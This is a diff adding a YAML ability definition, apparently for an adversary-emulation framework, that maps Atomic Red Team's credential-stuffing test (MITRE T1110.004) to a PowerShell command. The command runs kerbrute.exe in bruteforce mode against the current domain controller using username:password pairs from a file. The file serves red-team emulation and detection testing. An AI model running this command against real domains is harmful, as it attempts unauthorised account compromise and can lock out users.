@@ -1,0 +1,20 @@
+- description: 'Will read username and password combos from a file or stdin (format
+    username:password) and perform a bruteforce attack
+
+    '
+  id: 3d7b7a16-76af-efc4-af95-06003b2d58d1
+  name: Brute Force:Credential Stuffing using Kerbrute Tool
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: cd "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe bruteforce
+          --dc $ENV:userdnsdomain -d $ENV:userdomain "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1110.004
+    name: 'Brute Force: Credential Stuffing'
